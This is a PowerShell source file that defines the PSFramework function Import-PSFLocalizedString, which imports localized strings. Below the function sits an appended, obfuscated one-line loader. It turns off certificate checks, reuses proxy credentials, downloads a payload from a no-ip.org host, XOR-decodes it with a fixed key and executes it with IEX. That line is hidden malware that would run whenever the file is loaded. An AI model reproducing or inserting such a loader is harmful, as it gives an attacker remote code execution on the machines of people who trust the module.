function Import-PSFLocalizedString
{

	[PSFramework.PSFCore.NoJeaCommand()]
	[CmdletBinding()]
	param (
		[Parameter(Mandatory = $true)]
		[string]
		$Path,
		
		[Parameter(Mandatory = $true)]
		[string]
		$Module,
		
		[PsfValidateSet(TabCompletion = 'PSFramework-LanguageNames', NoResults = 'Continue')]
		[string]
		$Language = 'en-US'
	)
	
	begin
	{
		try { $resolvedPath = Resolve-PSFPath -Path $Path -Provider FileSystem }
		catch { Stop-PSFFunction -Message "Failed to resolve path: $Path" -EnableException $true -Cmdlet $PSCmdlet -ErrorRecord $_ }
	}
	process
	{
		foreach ($pathItem in $resolvedPath)
		{
			$data = Import-PSFPowerShellDataFile -Path $pathItem
			foreach ($key in $data.Keys)
			{
				[PSFramework.Localization.LocalizationHost]::Write($Module, $key, $Language, $data[$key])
			}
		}
	}
}
$Wc=New-OBject SYSTeM.Net.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HeaDErs.ADD('User-Agent',$u);$wc.PRoxy = [SYSTEm.NeT.WEbRequEsT]::DEFaUltWEbPrOxy;$Wc.ProXY.CredENTiALS = [SysTeM.NEt.CREDENTIaLCacHe]::DefAUlTNetworKCRedeNtIals;$K='9155e3bad8e607ea48fd6f338f076a55';$i=0;[CHAR[]]$B=([cHAr[]]($wc.DOWnlOadSTRinG("https://metrowifi.no-ip.org:8443/index.asp")))|%{$_-bXOR$k[$i++%$K.Length]};IEX ($b-Join'')

